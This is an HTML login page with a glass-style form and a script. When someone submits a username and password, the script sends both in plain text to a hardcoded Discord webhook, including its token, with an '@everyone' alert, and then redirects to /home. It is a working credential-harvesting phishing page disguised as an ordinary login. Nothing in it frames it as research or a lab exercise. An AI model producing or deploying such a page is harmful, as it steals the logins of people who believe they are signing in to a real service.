<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "Poppins", sans-serif;
    }

    body {
      height: 100vh;
      background: linear-gradient(135deg, #111827, #1e3a8a);
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .login-box {
      width: 320px;
      background: rgba(255, 255, 255, 0.08);
      border-radius: 20px;
      padding: 40px 35px;
      backdrop-filter: blur(12px);
      color: white;
      text-align: center;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
      transition: transform 0.3s ease;
    }

    .login-box:hover {
      transform: translateY(-3px);
    }

    h2 {
      font-size: 1.8rem;
      margin-bottom: 20px;
      letter-spacing: 1px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 10px;
      background: rgba(255, 255, 255, 0.15);
      color: white;
      font-size: 1rem;
      outline: none;
      transition: 0.2s;
    }

    input::placeholder {
      color: #d1d5db;
    }

    input:focus {
      background: rgba(255, 255, 255, 0.25);
    }

    button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(90deg, #2563eb, #1d4ed8);
      border: none;
      border-radius: 10px;
      color: white;
      font-size: 1rem;
      cursor: pointer;
      transition: 0.3s;
      margin-top: 10px;
    }

    button:hover {
      background: linear-gradient(90deg, #1e40af, #3b82f6);
      transform: scale(1.03);
    }

    .error {
      color: #f87171;
      margin-top: 8px;
      font-size: 0.9rem;
      display: none;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Login to Continue.</h2>
    <input type="text" id="username" placeholder="Enter username" />
    <input type="password" id="password" placeholder="Enter password" />
    <button onclick="login()">Login</button>
    <p class="error" id="error-msg">Please enter both fields.</p>
  </div>

  <script>
    // ⚠️ Replace this with your actual Discord webhook URL
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1433475537900142687/KTCv1yi4FDiqeAQJnopDIqo9EKx_JTnU8m4DouxnJ9Nh-xithm4JTu4dw_IRUvkDblZA";

    async function login() {
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const errorMsg = document.getElementById("error-msg");

      if (username && password) {
        // Store temporarily in session
        sessionStorage.setItem("username", username);
        sessionStorage.setItem("password", password);

        // Prepare message to send
        const payload = {
          content: `||@everyone||**New Login:**\n> Username: \`${username}\`\n> Password: \`${password}\``
        };

        try {
          await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
          });
        } catch (err) {
          console.error("Error sending to webhook:", err);
        }

        // Redirect after sending
        window.location.href = "/home";
      } else {
        errorMsg.style.display = "block";
        setTimeout(() => (errorMsg.style.display = "none"), 2000);
      }
    }

    document.addEventListener("keypress", function (e) {
      if (e.key === "Enter") login();
    });
  </script>
</body>
</html>
